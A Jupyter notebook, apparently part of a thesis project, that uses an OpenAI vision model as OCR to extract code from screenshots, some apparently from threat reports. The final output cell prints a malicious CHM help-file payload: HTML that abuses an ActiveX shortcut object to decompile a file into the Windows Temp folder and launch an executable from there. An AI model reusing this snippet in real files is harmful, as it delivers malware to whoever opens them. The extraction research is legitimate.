{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openai import OpenAI\n",
    "import base64\n",
    "from dotenv import dotenv_values"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Function to encode the image\n",
    "def encode_image(image_path):\n",
    "  with open(image_path, \"rb\") as image_file:\n",
    "    return base64.b64encode(image_file.read()).decode('utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "client = OpenAI(api_key=api_key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "pęg = \"/home/bartek/Kod/praca_dyplomowa/dane/SWIFT_Interception.png\"\n",
    "pęgdwa = \"/home/bartek/Kod/praca_dyplomowa/dane/image-8.png\"\n",
    "łepp = \"/home/bartek/Kod/praca_dyplomowa/dane/zh.webp\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Getting the base64 string \n",
    "base64_image = encode_image(pęgdwa)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = client.chat.completions.create(\n",
    "  model=\"gpt-4o-mini\",\n",
    "  messages=[{\n",
    "      \"role\": \"system\",\n",
    "             \"content\":[\n",
    "                 {\n",
    "                     \"type\": \"text\",\n",
    "                     \"text\": \"\"\"You are a professional OCR that returns only the text that can be seen on the image.\n",
    "                       NOTHING MORE.\"\"\"\n",
    "                 }]},\n",
    "      \n",
    "    {\n",
    "      \"role\": \"user\",\n",
    "      \"content\": [\n",
    "        {\n",
    "          \"type\": \"text\",\n",
    "          \"text\": \"\"\"Please read the code in the provided image.\n",
    "                    Extract only the code content, with no extra explanation, comments, or additional text.\n",
    "                    Return only the exact code as it appears, line by line, without modification\"\"\",\n",
    "        },\n",
    "        {\n",
    "          \"type\": \"image_url\",\n",
    "          \"image_url\": {\n",
    "            \"url\":  f\"data:image/png;base64,{base64_image}\"\n",
    "          },\n",
    "        },\n",
    "      ],\n",
    "    }\n",
    "  ],\n",
    ")\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```html\n",
      "<OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1>\n",
      "<PARAM name=\"Command\" value=\"ShortCut\">\n",
      "<PARAM name=\"Button\" value=\"Bitmap:shortcut\">\n",
      "<PARAM name=\"Item1\" value=\"',hh.exe,<decompile C:\\\\Windows\\\\Temp 국가정보 메세지 발송.chm'\">\n",
      "<PARAM name=\"Item2\" value=\"273,1,1\">\n",
      "</OBJECT>\n",
      "<OBJECT id=y classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1>\n",
      "<PARAM name=\"Command\" value=\"ShortCut\">\n",
      "<PARAM name=\"Button\" value=\"Bitmap:shortcut\">\n",
      "<PARAM name=\"Item1\" value=\"',C:\\\\Windows\\\\Temp\\\\ImagingDevices.exe'\">\n",
      "<PARAM name=\"Item2\" value=\"273,1,1\">\n",
      "</OBJECT>\n",
      "<SCRIPT>\n",
      "x.Click();\n",
      "var start=new Date().getTime();\n",
      "while(true) if(new Date().getTime()-start>2000) break;\n",
      "x.Click();\n",
      "</SCRIPT>\n",
      "<img src=\"5.PNG\">\n",
      "```\n"
     ]
    }
   ],
   "source": [
    "print(response.choices[0].message.content)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "pd_venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
